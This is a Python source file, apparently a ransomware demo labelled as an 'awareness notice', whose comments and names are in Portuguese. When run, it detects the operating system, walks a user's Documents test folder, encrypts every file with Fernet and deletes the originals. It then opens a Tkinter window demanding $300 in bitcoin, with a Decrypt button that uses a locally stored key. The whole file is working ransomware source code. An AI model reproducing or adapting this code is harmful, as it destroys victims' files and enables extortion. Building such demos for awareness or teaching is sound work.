from cryptography.fernet import Fernet
import os
import platform
import tkinter as tk
from PIL import Image, ImageTk
import sys

def user_name():
    if os.name == 'posix':
        return os.getenv('USER') 
    elif os.name == 'nt':    
        return os.getenv('USERNAME')

def generate_key():
    return Fernet.generate_key()

def load_key(key_path):
    with open(key_path, 'rb') as key_file:
        return key_file.read()

def save_key(key, key_path):
    with open(key_path, 'wb') as key_file:
        return key_file.write(key)

def encrypt_file(file_path, key, output_path):
    with open(file_path, 'rb') as file:
        data = file.read()

    ciper_suit = Fernet(key)
    encrypted_data = ciper_suit.encrypt(data) 

    with open(output_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted_data)

def decrypt_file(encrypted_path, key, output_path):
    with open(encrypted_path, 'rb') as encrypted_file:
        encrypted_data = encrypted_file.read()

    cipher_suite = Fernet(key)
    decrypted_data = cipher_suite.decrypt(encrypted_data)

    with open(output_path, 'wb') as decrypted_file:
        decrypted_file.write(decrypted_data)

def criptografar(diretorio_path, key):
    for root, dirs, files in os.walk(diretorio_path):
        for filename in files:
            file_path = os.path.join(root, filename)
            output_path = os.path.join(root, f'encrypted_{filename}')
            encrypt_file(file_path, key, output_path)
            os.remove(file_path)

    print('Processo de criptografia realizado com sucesso')

def identificar_so():
    sistema = platform.system()
    release = platform.release()

    if 'Windows' in sistema:
        print(f'Sistema Operacional: {sistema}')
        print(f'Release: {release}')
        nome = user_name()
        diretorio = f'C:\\Users\\{nome}\\Documents\\Teste'

        
    elif 'Linux' in sistema:
        distro = platform.freedesktop_os_release()
        print(distro['NAME'], distro['VERSION'])
        nome = user_name()
        diretorio = f'/home/{nome}/Documentos/teste'
    
        
    else:
        print(f'Sistema Operacional não reconhecido: {sistema}')

    key_path = 'key.key'
    if os.path.exists(key_path):
        key = load_key(key_path)
    else:
        key = generate_key()
        save_key(key, key_path)

    criptografar(diretorio, key)
    
    return sistema

so = identificar_so()

def on_decrypt_button_click():
    key_path = 'key.key'
    if os.path.exists(key_path):
        key = load_key(key_path)
        sistema = platform.system()
        nome = user_name()
        if sistema == 'Windows':
            diretorio_path = f'C:\\Users\\{nome}\\Documents\\Teste'
        elif sistema == 'Linux':
            diretorio_path = f'/home/{nome}/Documentos/teste'
        else:
            print(f'Sistema Operacional não reconhecido: {sistema}')
            return

        for filename in os.listdir(diretorio_path):
            if filename.startswith('encrypted_'):
                encrypted_file_path = os.path.join(diretorio_path, filename)
                decrypted_file_path = os.path.join(diretorio_path, filename[len('encrypted_'):])
                decrypt_file(encrypted_file_path, key, decrypted_file_path)
                print(f'Arquivo {filename} descriptografado.')

        print('Processo de descriptografia realizado com sucesso')

def exibir_conscientizacao():
    janela = tk.Tk()
    janela.title("Aviso de Conscientização")
    janela.geometry("1280x800")
    
    label = tk.Label(janela, justify="left")
    label.pack()
    image_path = os.path.join(os.path.abspath(sys._MEIPASS), "pacote/rans.png")
    image = Image.open(image_path)
    image = image.resize((800, 600), Image.LANCZOS)
    photo = ImageTk.PhotoImage(image)
    imagem_label = tk.Label(janela, image=photo)
    imagem_label.image = photo
    imagem_label.pack()

    instrucao_label = tk.Label(janela, text="Send $300 worth of bitcoin to this address:")
    instrucao_label.pack()

    endereco_label = tk.Label(janela, text="39279fshdfskbAWEas342ssfe24afgDWhkl2313jnsp$Mw")
    endereco_label.pack()

    botao_copy = tk.Button(janela, text="Copy")
    botao_copy.pack()

    botao_check = tk.Button(janela, text="Check Payment")
    botao_check.pack(side=tk.LEFT)

    botao_decrypt = tk.Button(janela, text="Decrypt", command=on_decrypt_button_click)
    botao_decrypt.pack(side=tk.RIGHT)

    botao_check.place(relx=0.4, rely=0.9, anchor="center")
    botao_decrypt.place(relx=0.6, rely=0.9, anchor="center")

    janela.mainloop()

if __name__ == "__main__":
    exibir_conscientizacao()
